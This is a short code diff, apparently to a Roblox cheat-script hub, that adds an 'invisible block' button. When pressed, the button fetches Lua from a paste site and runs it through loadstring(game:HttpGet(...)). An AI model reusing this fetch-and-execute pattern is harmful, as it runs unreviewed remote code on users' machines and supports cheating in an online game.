@@ -2861,7 +2861,13 @@ local Toggle = Tabtsb:CreateToggle({
     end,
 })
 
+local Button = Tabtsb:CreateButton({
+   Name = "invisible block",
+   Callback = function()
 loadstring(game:HttpGet('https://pastefy.app/dCvpeFfn/raw'))()
+   -- The function that takes place when the button is pressed
+   end,
+})
 
 local Section = Tab:CreateSection("death counter")
 local Button = Tab:CreateButton({
